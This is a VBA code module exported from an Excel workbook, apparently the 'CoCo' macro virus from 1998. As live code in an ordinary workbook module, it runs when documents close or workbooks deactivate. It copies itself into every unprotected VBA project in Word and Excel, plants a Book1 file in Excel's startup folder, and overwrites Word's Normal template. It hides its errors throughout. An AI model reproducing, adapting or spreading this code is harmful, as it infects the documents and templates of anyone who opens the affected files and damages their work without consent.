   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisWorkbook"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   'Copyright (C) 1998 by FlyShadow ~^^~ - CoCo
   Private Declare Function FindWindowA Lib "user32" (ByVal strClassName As String, ByVal lpWindowName As Any) As Long: Dim £f As String
   Private Sub Document_Close()
   On Error Resume Next
   £f = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 70): £d Application
   If FindWindowA("XLMain", 0&) Then £d GetObject(, "Excel.Application"): Exit Sub
   Set £j = CreateObject("Excel.Application")
   If UCase(Dir(£j.StartupPath + "\Book1.")) <> "BOOK1" Then
   Set £c = £j.Workbooks.Add
   £c.VBProject.VBComponents(1).CodeModule.InsertLines 1, £f
   £c.SaveAs £j.StartupPath & "\Book1."
   £c.Quit: End If
   End Sub
   Private Sub Workbook_Deactivate()
   On Error Resume Next
   £f = ThisWorkbook.VBProject.VBComponents(1).CodeModule.Lines(1, 70): £d Application
   If FindWindowA("OpusApp", 0&) Then £d GetObject(, "Word.Application"): Exit Sub
   Set £j = CreateObject("Word.Application")
   If £j.NormalTemplate.VBProject.Description <> "CoCo" Then
   £j.NormalTemplate.VBProject.Description = "CoCo"
   With £j.NormalTemplate.VBProject.VBComponents(1).CodeModule
   .DeleteLines 1, .CountOfLines: .AddFromString £f: End With
   £j.Quit: End If
   End Sub
   Private Sub £d(£o As Object)
   For Each £g In £o.VBE.VBProjects
   If £g.Protection <> 1 And £g.Description <> "CoCo" Then
   £g.Description = "CoCo": With £g.VBComponents(1).CodeModule
   .DeleteLines 1, .CountOfLines: .AddFromString £f
   End With: End If: Next
   End Sub
